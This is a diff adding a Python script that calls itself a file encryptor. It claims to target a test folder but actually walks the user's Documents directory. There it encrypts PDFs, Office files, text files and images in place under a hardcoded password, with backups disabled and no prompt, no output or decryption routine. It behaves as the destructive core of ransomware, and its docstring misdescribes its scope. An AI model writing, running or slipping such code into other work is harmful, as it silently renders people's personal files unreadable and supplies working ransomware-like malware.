@@ -1,0 +1,128 @@
+"""
+FILE ENCRYPTOR - Automatically encrypts files in D:\Test
+Files keep the SAME name - no .encrypted extension visible
+"""
+
+import os
+import hashlib
+import secrets
+import shutil
+import platform
+import platformdirs
+from pathlib import Path
+
+# ================= CONFIGURATION =================
+
+# Dynamically fetches the real, OS-sanctioned documents directory
+try:
+    TARGET_FOLDER = Path(platformdirs.user_documents_dir())
+except Exception:
+        # Fallback to standard pathlib if platformdirs encounters an issue
+    TARGET_FOLDER = Path.home() / "Documents"
+
+ENCRYPT_EXTENSIONS = {'.pdf', '.docx', '.txt', '.jpg', '.png', '.xlsx'}
+
+# Hardcoded 16-character password
+PASSWORD = "S3cur3P@ssw0rd!X"
+
+# Backup original files? (Recommended: True, so you can recover if something goes wrong)
+BACKUP_ORIGINALS = False
+
+# ================= ENCRYPTION ENGINE =================
+class FileEncryptor:
+    def __init__(self):
+        self.password = PASSWORD.encode('utf-8')
+        os.makedirs(TARGET_FOLDER, exist_ok=True)
+        if BACKUP_ORIGINALS:
+            self.backup_folder = os.path.join(TARGET_FOLDER, "Backup")
+            os.makedirs(self.backup_folder, exist_ok=True)
+
+    def _derive_key(self, salt: bytes) -> bytes:
+        key = self.password + salt
+        for _ in range(100000):
+            key = hashlib.sha256(key).digest()
+        return key
+
+    def encrypt_file(self, file_path: str) -> bool:
+        try:
+            salt = secrets.token_bytes(32)
+            
+            with open(file_path, 'rb') as f:
+                plaintext = f.read()
+            
+            if BACKUP_ORIGINALS:
+                backup_path = os.path.join(self.backup_folder, os.path.basename(file_path))
+                with open(backup_path, 'wb') as f:
+                    f.write(plaintext)
+            
+            file_hash = hashlib.sha3_512(plaintext).hexdigest()
+            
+            metadata = {
+                'original_size': len(plaintext),
+                'hash': file_hash,
+                'salt': salt.hex()
+            }
+            
+            key = self._derive_key(salt)
+            
+            key_stream = b''
+            counter = 0
+            while len(key_stream) < len(plaintext):
+                counter_bytes = counter.to_bytes(4, 'big')
+                key_stream += hashlib.sha256(key + counter_bytes).digest()
+                counter += 1
+            key_stream = key_stream[:len(plaintext)]
+            
+            ciphertext = bytes(a ^ b for a, b in zip(plaintext, key_stream))
+            
+            with open(file_path, 'wb') as f:
+                f.write(b"ENCFILEv1")
+                f.write(salt)
+                meta_json = str(metadata).encode()
+                f.write(len(meta_json).to_bytes(4, 'big'))
+                f.write(meta_json)
+                f.write(ciphertext)
+            
+            return True
+        except Exception as e:
+            return False
+
+    def encrypt_all(self):
+        files_to_encrypt = []
+        
+        for dirpath, _, filenames in os.walk(TARGET_FOLDER):
+            if BACKUP_ORIGINALS and hasattr(self, 'backup_folder') and dirpath == self.backup_folder:
+                continue
+                
+            for fname in filenames:
+                ext = os.path.splitext(fname)[1].lower()
+                full_path = os.path.join(dirpath, fname)
+                
+                is_encrypted = False
+                try:
+                    with open(full_path, 'rb') as test_f:
+                        header = test_f.read(9)
+                        if header == b"ENCFILEv1":
+                            is_encrypted = True
+                except:
+                    pass
+                
+                if ext in ENCRYPT_EXTENSIONS and not is_encrypted:
+                    files_to_encrypt.append(full_path)
+        
+        if not files_to_encrypt:
+            return
+        
+        for file_path in files_to_encrypt:
+            self.encrypt_file(file_path)
+
+# ================= MAIN =================
+def main():
+    if not os.path.exists(TARGET_FOLDER):
+        os.makedirs(TARGET_FOLDER, exist_ok=True)
+    
+    encryptor = FileEncryptor()
+    encryptor.encrypt_all()
+
+if __name__ == "__main__":
+    main()
